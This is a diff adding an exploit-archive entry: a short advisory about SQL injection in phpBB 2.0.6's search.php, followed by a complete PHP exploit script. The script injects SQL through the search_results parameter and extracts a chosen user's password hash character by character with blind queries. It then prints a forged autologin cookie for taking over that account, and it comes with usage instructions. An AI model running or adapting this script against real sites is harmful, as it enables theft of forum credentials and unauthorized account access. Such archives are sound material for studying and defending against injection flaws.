@@ -1,0 +1,185 @@
+source: http://www.securityfocus.com/bid/9883/info
+
+A vulnerability has been reported to exist in the software that may allow a remote user to inject malicious SQL syntax into database queries. The problem reportedly exists in one of the parameters of the search.php script. This issue is caused by insufficient sanitization of user-supplied data. A remote attacker may exploit this issue to influence SQL query logic to disclose sensitive information that could be used to gain unauthorized access.
+
+#!/usr/bin/php -q
+phpBB 2.0.6  fetch password hash by pokleyzz <pokleyzz at scan-associates.net>
+
+<?php
+/*
+# phpBB 2.0.6  fetch password hash by pokleyzz <pokleyzz at scan-associates.net>
+# 4th January 2004 : 3:05 a.m
+#
+# bug found by pokleyzz (4th January 2004 )
+#
+# Requirement:
+#	PHP 4.x with curl extension;
+#
+# Greet: 
+#	tynon, sk ,wanvadder,  sir_flyguy, wxyz , tenukboncit, kerengga_kurus , 
+#	s0cket370 , b0iler and ...
+#
+#
+# ---------------------------------------------------------------------------- 
+# "TEH TARIK-WARE LICENSE" (Revision 1):
+# wrote this file. As long as you retain this notice you 
+# can do whatever you want with this stuff. If we meet some day, and you think 
+# this stuff is worth it, you can buy me a "teh tarik" in return. 
+# ---------------------------------------------------------------------------- 
+# (Base on Poul-Henning Kamp Beerware)
+#
+# Tribute to Search + Wings - "gemuruh.mp3" :P
+#
+*/
+
+// a:2:{s:11:"autologinid";s:32:"e10adc3949ba59abbe56e057f20f883e";s:6:"userid";s:1:"2";}
+$start=time();
+if (!(function_exists('curl_init'))) {
+	echo "cURL extension required\n";
+	exit;
+}
+
+ini_set("max_execution_time","999999");
+ 
+$matches="mode=viewprofile";
+
+$charmap=array (48,49,50,51,52,53,54,55,56,57,
+		  97,98,99,100,101,102,
+		  103,104,105,
+		  106,107,108,109,110,111,112,113,
+		  114,115,116,117,118,119,120,121,122
+		  );
+		  
+if($argv[3]){
+	
+	$url=$argv[1];
+	$username=$argv[2];
+	//$userid=$argv[2];
+	$topic_id=$argv[3];
+	if ($argv[4])
+		$proxy=$argv[4]; 
+}
+else {
+	echo "Usage: ".$argv[0]." <URL> <username> <topic_id> [proxy]\n\n";
+	echo "\tURL\t URL to phpnBB site (ex: http://127.0.0.1/html)\n";
+	echo "\taid\t username to get  (ex: admin)\n";
+	echo "\ttopic_id\t topic id where user have post (ex: 1,2,3,45,6)\n"; 
+	echo "\tproxy\t optional proxy url  (ex: http://10.10.10.10:8080)\n"; 
+	exit;
+}
+
+//$action="/search.php?search_id=unanswered";
+$action="/search.php?search_id=test";
+//$postvar="total_match_count=1&search_forum=1&search_ids[]=";
+$postvar="show_results=topics&search_results=";
+// detect if sql injection allowed
+
+$ch=curl_init();
+if ($proxy){
+	curl_setopt($ch, CURLOPT_PROXY,$proxy); 
+}
+curl_setopt($ch, CURLOPT_URL,$url.$action);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $postvar."'");
+$res=curl_exec ($ch);
+curl_close ($ch);
+//echo $res;
+if (!ereg("General Error",$res)){
+	echo "Not vulnerable. register_global=off\n";
+	exit();
+}
+
+
+
+
+$i=0;
+$tmp="char(";
+while ($i < strlen($username)){
+	$tmp .= ord(substr($username,$i,1));
+	$i++;
+	if ($i < strlen($username)){
+		$tmp .= ",";
+	} 
+}
+$tmp .= ")";
+
+$cusername=$tmp;
+
+// get userid and data cookie name
+//$sql="$topic_id)+AND+pt.post_id=p.post_id+AND+f.forum_id=p.forum_id+AND+p.topic_id=t.topic_id+AND+p.poster_id=u.user_id+and+u.username={$cusername}+ORDER+BY+p.post_time+DESC+LIMIT+0,2/*";
+//$sql="99999)+or+(+p.forum_id=$topic_id+and+pt.post_id=p.post_id+AND+f.forum_id=p.forum_id+AND+p.topic_id=t.topic_id+AND+p.poster_id=u.user_id+and+u.username={$cusername}+)+ORDER+BY+p.post_time+DESC+LIMIT+0,15/*";
+//$sql="999999)+or+(u.username={$cusername})+LIMIT+0,2/*";
+$sql = "$topic_id)+AND+t.topic_poster=u.user_id+AND+f.forum_id=t.forum_id+AND+p.post_id=t.topic_first_post_id+AND+p2.post_id=t.topic_last_post_id+AND+u2.user_id=p2.poster_id+and+u.username={$cusername}+LIMIT+0,2/*";
+
+$ch=curl_init();
+if ($proxy){
+	curl_setopt($ch, CURLOPT_PROXY,$proxy); 
+}
+curl_setopt($ch, CURLOPT_URL,$url.$action);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+curl_setopt($ch, CURLOPT_HEADER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $postvar.$sql);
+
+$res=curl_exec ($ch);
+curl_close ($ch);
+
+preg_match("/ (.)*_data=/",$res,$ap);
+$cookiename=trim(ereg_replace("=","",$ap[0]));
+
+if (preg_match("/mode=viewprofile&u=.*>$username/i",$res,$ap)){
+	preg_match("/mode=viewprofile&u=[0-9]+/i",$ap[0],$ap2);
+	$userid=preg_replace("/mode=viewprofile&u=/","",$ap2[0]);
+	echo $userid;
+}
+else {
+	echo "\n[x] Error occur... no result for this topic id\n";
+	exit();	
+}
+
+echo "Take your time for Teh Tarik... please wait ...\n\n";
+echo "Result:\n";
+
+echo "\t{$userid}:${username}:";
+
+//get password hash
+for($i= 1;$i< 33;$i++){ 
+	foreach ($charmap as $char){
+		echo chr($char);
+		$sql="$topic_id)+AND+t.topic_poster=u.user_id+AND+f.forum_id=t.forum_id+AND+p.post_id=t.topic_first_post_id+AND+p2.post_id=t.topic_last_post_id+AND+u2.user_id=p2.poster_id+and+u.user_id={$userid}+and+ascii(substring(u.user_password,$i,1))={$char}+LIMIT+0,2/*";
+		$ch=curl_init();
+		if ($proxy){
+			curl_setopt($ch, CURLOPT_PROXY,$proxy); 
+		}
+		curl_setopt($ch, CURLOPT_URL,$url.$action);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+		curl_setopt($ch, CURLOPT_POST, 1);
+		curl_setopt($ch, CURLOPT_POSTFIELDS, $postvar.$sql);
+		$res=curl_exec ($ch);
+		curl_close ($ch);
+		if (ereg($matches,$res)){
+			//echo chr($char);
+			$password .= chr($char);
+			break 1;
+		}
+		else {
+			echo chr(8);
+		}
+		
+		if ($char ==103){
+			echo "\n\n[x] Something wrong occur possibly network not stable...\n";
+			exit();
+		}
+		
+	}
+}
+
+$autologin=array();
+$autologin["autologinid"]=trim($password);
+$autologin["userid"]=trim($userid);
+$res=serialize($autologin);
+$res=ereg_replace(";","%3B",$res);
+echo "\n\nAuto login cookies:\n\t{$cookiename}={$res}\n";
+
+?>
